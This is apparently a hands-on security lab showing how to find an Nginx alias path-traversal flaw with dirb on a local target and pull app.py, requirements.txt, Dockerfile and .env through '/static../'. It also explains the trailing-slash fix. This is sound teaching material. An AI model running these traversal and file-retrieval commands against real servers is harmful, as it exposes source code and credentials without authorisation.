# Lab 03 - Test Path Traversal with dirb

## Objective

Use `dirb` to perform directory and file brute-forcing to discover hidden paths, files, and potential vulnerabilities in the Nginx configuration.

## Background

Path traversal and directory brute-forcing are essential techniques for discovering:
- Hidden administrative interfaces
- Backup files
- Configuration files
- Development/testing endpoints
- Improperly secured directories

`dirb` is a web content scanner that uses wordlists to find existing (and/or hidden) web objects.

## Prerequisites

### Install dirb (if needed)

**macOS:**
```bash
brew install dirb
```

**Linux:**
```bash
sudo apt-get install dirb
```

## Steps

### 1. Initial Directory Scan with Common Wordlist

First, run a basic `dirb` scan using the common wordlist to discover available directories:

```bash
dirb http://localhost:8080 /usr/share/dirb/wordlists/common.txt
```

**What to look for:**
- Watch the output for HTTP 200 and 301 responses
- Note any directories that are discovered (like `/static/`, `/help/`, `/resumes/`, etc.)
- The scan may take a few minutes

**Expected discoveries:**
```
==> DIRECTORY: http://localhost:8080/static/
==> DIRECTORY: http://localhost:8080/help/
==> DIRECTORY: http://localhost:8080/resumes/
```

Write down the directories you find - you'll need them for the next step!

### 2. Test for Nginx Alias Path Traversal

Now that you've discovered some directories, it's time to test for a common Nginx misconfiguration. We'll test each discovered directory for path traversal vulnerabilities.

**The vulnerability pattern:** `/<directory>../`

For each directory you found in step 1, run `dirb` against the path traversal variant:

```bash
# Test static directory for path traversal
dirb http://localhost:8080/static../

# Test help directory for path traversal
dirb http://localhost:8080/help../

# Test resumes directory for path traversal
dirb http://localhost:8080/resumes../
```

**What's happening here?**

When you request `/static../`, if Nginx has an alias misconfiguration, it will:
1. Match the `/static` location
2. Resolve the alias path + `../`
3. Potentially expose the parent directory

**Watch for:**
- One of these should return different results than the others
- Look for HTTP 200 responses to files like `app.py`, `requirements.txt`
- The vulnerable directory will expose application files!

### 3. Identify the Vulnerable Endpoint

Compare the results from each `dirb` scan. One directory should show accessible files that shouldn't be there:

```bash
# Example: If static../ is vulnerable, you might see:
+ http://localhost:8080/static../app.py (CODE:200)
+ http://localhost:8080/static../requirements.txt (CODE:200)
+ http://localhost:8080/static../Dockerfile (CODE:200)
```

### 4. Manually Verify the Path Traversal

Once you've identified which directory is vulnerable (likely `static../`), verify it manually:

```bash
# Test the path traversal (replace 'static' with your vulnerable directory)
curl -v http://localhost:8080/static../

# Try to access application files
curl http://localhost:8080/static../app.py
curl http://localhost:8080/static../requirements.txt
```

**Why does this work?**

This is a classic Nginx alias misconfiguration vulnerability. The server is configured with something like:
```nginx
location /static {
    alias /app/static/;
}
```

When you request `/static../`, Nginx resolves this as `/app/static/../` which becomes `/app/`, exposing the entire application directory!

### 5. Extract the Critical Files

Now retrieve the files you've discovered:

```bash
# Save requirements.txt (you'll need this for Lab 04!)
curl http://localhost:8080/static../requirements.txt -o requirements.txt

# View the application source code
curl http://localhost:8080/static../app.py

# Check for other files
curl http://localhost:8080/static../Dockerfile
curl http://localhost:8080/static../.env
```

### 6. Document Your Findings

Create a note of what you discovered:

```
Path Traversal Vulnerability Found!
====================================
Initial Scan: Discovered directories using common.txt wordlist
- /static/
- /help/
- /resumes/

Path Traversal Testing: Tested each directory with ../ pattern
- /static../ - VULNERABLE! ✓
- /help../ - Not vulnerable
- /resumes../ - Not vulnerable

Vulnerable Endpoint: /static../
Root Cause: Nginx alias misconfiguration on /static location

Accessible Files via /static../:
- app.py (application source code)
- requirements.txt (Python dependencies)
- Dockerfile (container configuration)

Security Impact: HIGH
- Complete source code disclosure
- Dependency information exposed
- Potential for discovering sensitive configuration files
```

## Understanding the Two-Phase Discovery Process

### Phase 1: Standard Directory Enumeration
Using `dirb` with common wordlists reveals the "intended" structure:
- `/static/` - For CSS, JS, images
- `/help/` - Help documentation
- `/resumes/` - Resume storage/processing

### Phase 2: Path Traversal Testing
Testing each directory with `../` reveals misconfigurations:
- Most directories: properly configured (returns 404 or redirects)
- `/static../`: **Vulnerable!** Exposes parent directory

### Why Only `/static` is Vulnerable?

The vulnerability exists because of how the Nginx `alias` directive is configured:

**Vulnerable `/static` Configuration:**
```nginx
location /static {
    alias /app/static/;
}
```

**Secure `/help` Configuration:**
```nginx
location /help/ {
    alias /app/help/;
}
```

**The difference:** The trailing slash in the `location` directive! The `/help/` path requires the trailing slash, preventing the `../` traversal.

## Alternative Testing Method (Custom Wordlist)

If you want to automate the path traversal testing, you can create a custom wordlist:

```bash
# Create wordlist with path traversal patterns for discovered directories
cat > traversal-wordlist.txt << EOF
static../
help../
resumes../
uploads../
admin../
api../
EOF

# Run dirb with the traversal wordlist
dirb http://localhost:8080 traversal-wordlist.txt
```

This will test multiple directories at once, but manual testing (as shown in steps 2-3) helps you understand what's happening!

## Understanding the Vulnerability

### What is an Nginx Alias Misconfiguration?

The vulnerability occurs when Nginx's `alias` directive is used without proper path validation:

**Vulnerable Configuration:**
```nginx
location /static {
    alias /app/static/;
}
```

**What happens:**
1. Request: `GET /static../app.py`
2. Nginx processes: `/app/static/` + `../app.py`
3. Resolves to: `/app/app.py`
4. Result: Source code exposed!

**Secure Configuration:**
```nginx
location /static/ {
    alias /app/static/;
}
```
Note the trailing slash on the location path - this prevents the traversal.

## Key Discoveries from the Lab

By following the two-phase discovery process, you should have found:

**Phase 1 - Standard directories** (via `dirb` with common.txt):
- `/static/` - Static files directory
- `/help/` - Help/documentation
- `/resumes/` - Resume processing area

**Phase 2 - Path traversal on each directory** (via `dirb http://localhost:8080/<dir>../`):
- `/help../` - Not vulnerable (404 or proper redirect)
- `/resumes../` - Not vulnerable (404 or proper redirect)
- `/static../` - **VULNERABLE!** Exposes application files:

  1. **app.py** - The main Flask application source code
     ```bash
     curl http://localhost:8080/static../app.py
     ```

  2. **requirements.txt** - Python package dependencies (critical for next lab!)
     ```bash
     curl http://localhost:8080/static../requirements.txt
     ```

  3. **Dockerfile** - Container configuration
     ```bash
     curl http://localhost:8080/static../Dockerfile
     ```

## Expected Findings Summary

**Step 1 Results** - Initial `dirb` scan with common.txt:
```
==> DIRECTORY: http://localhost:8080/static/
==> DIRECTORY: http://localhost:8080/help/
==> DIRECTORY: http://localhost:8080/resumes/
```

**Step 2 Results** - Path traversal testing on each directory:
```
# dirb http://localhost:8080/help../
[Empty results or 404s - Not vulnerable]

# dirb http://localhost:8080/resumes../
[Empty results or 404s - Not vulnerable]

# dirb http://localhost:8080/static../
+ http://localhost:8080/static../app.py (CODE:200)
+ http://localhost:8080/static../requirements.txt (CODE:200)
+ http://localhost:8080/static../Dockerfile (CODE:200)
[VULNERABLE! Files exposed!]
```

## Verification Checklist

- [ ] Ran initial `dirb` scan with common.txt wordlist
- [ ] Identified discovered directories (static, help, resumes)
- [ ] Tested each directory for path traversal with `dirb http://localhost:8080/<dir>../`
- [ ] Identified `/static../` as the vulnerable endpoint
- [ ] Retrieved `app.py` via `/static../app.py`
- [ ] Retrieved `requirements.txt` via `/static../requirements.txt` (**Essential for next lab!**)
- [ ] Understood why only `/static` is vulnerable (missing trailing slash)
- [ ] Documented findings with security impact assessment

## Questions to Answer

1. What directories did you discover in the initial `dirb` scan?
2. Which directory was vulnerable to path traversal? Why only that one?
3. What's the difference between `/static` and `/help/` configurations that makes one vulnerable?
4. What sensitive information is contained in `app.py`?
5. What Python packages are listed in `requirements.txt`?
6. How could this vulnerability be prevented in the Nginx configuration?
7. What other files might be accessible through this path traversal?
8. Could you access system files like `/etc/passwd` through this vulnerability?

## Security Impact

**Severity:** HIGH

**Why this matters:**
- **Source Code Disclosure:** Attackers can read `app.py` to understand application logic, find other vulnerabilities, and discover hardcoded secrets
- **Dependency Information:** `requirements.txt` reveals exact library versions, enabling targeted exploits against known CVEs
- **Configuration Exposure:** May reveal database credentials, API keys, and other sensitive data
- **Attack Chain:** This discovery enables the next phase of exploitation (analyzing dependencies for vulnerabilities)

## Next Steps

Now that you've discovered `requirements.txt` and `app.py` through the two-phase process (standard enumeration + path traversal testing), proceed to [Lab 04 - Locate Source Code and Requirements](lab-04-locate-source.md) to:
- Analyze the application dependencies in detail
- Identify vulnerable packages with known CVEs
- Prepare for targeted exploitation

**Key Takeaway:** The systematic approach of first discovering directories with `dirb` using common.txt, then testing each directory for path traversal vulnerabilities (`/static../`, `/help../`, etc.), revealed the Nginx alias misconfiguration on `/static` that exposed the entire application directory!

---

[← Previous: Interrogate Server](lab-02-interrogate-server.md) | [Next: Locate Source Code →](lab-04-locate-source.md)
